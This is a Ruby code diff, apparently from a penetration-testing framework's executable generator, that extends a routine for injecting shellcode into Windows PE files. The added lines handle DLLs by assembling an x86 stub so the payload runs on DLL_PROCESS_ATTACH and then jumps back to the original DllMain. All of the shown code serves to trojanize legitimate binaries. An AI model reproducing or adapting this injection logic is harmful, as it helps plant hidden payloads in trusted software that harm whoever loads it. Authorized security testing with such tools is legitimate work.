@@ -194,8 +194,35 @@ require 'digest/sha1'
 			# figure out where in the new section to put the start. Right now just putting at the beginning of the new section
 			start_rva = free_rva
 
+			# find offset of entry point from new section
+			entry_off = pe.hdr.opt.AddressOfEntryPoint - start_rva
+
+			# if this is a DLL, only spawn shellcode when first loaded
+			skip = ''
+			if (pe.hdr.file.Characteristics | Rex::PeParsey::PeBase::IMAGE_FILE_DLL) != 0
+
+				# if there is no entry point, just return after we bail or spawn shellcode
+				if pe.hdr.opt.AddressOfEntryPoint == 0
+					skipasm = "cmp [esp + 8], 1
+							jz spawncode
+							xor eax, eax
+							inc eax
+							ret 0x0c
+							spawncode:"
+					entry_off = -6 # offset of xor eax, eax; inc eax; ret 0x0c instructions to return TRUE
+					skip = Metasm::Shellcode.assemble(Metasm::Ia32.new, skipasm).encoded.data
+				else
+					# there is an entry point, we'll need to go to it after we bail or spawn shellcode
+					# if fdwReason != DLL_PROCESS_ATTACH, skip the shellcode, jump back to original DllMain
+					skipasm = "cmp [esp + 8], 1
+							jnz $+" + (entry_off - 5).to_s # cmp instruction is 5 bytes
+					skip = Metasm::Shellcode.assemble(Metasm::Ia32.new, skipasm).encoded.data
+					entry_off -= skip.length # adjusted offset of original entry point for inserted code
+				end
+			end
+
 			#make new section, starting at free RVA
-			new_sec = win32_rwx_exec_thread(code, pe.hdr.opt.AddressOfEntryPoint - start_rva)
+			new_sec = skip + win32_rwx_exec_thread(code, entry_off)
 			#pad to file alignment
 			new_sec += "\x00" * (pe.hdr.opt.SectionAlignment-(new_sec.length % pe.hdr.opt.SectionAlignment))
 
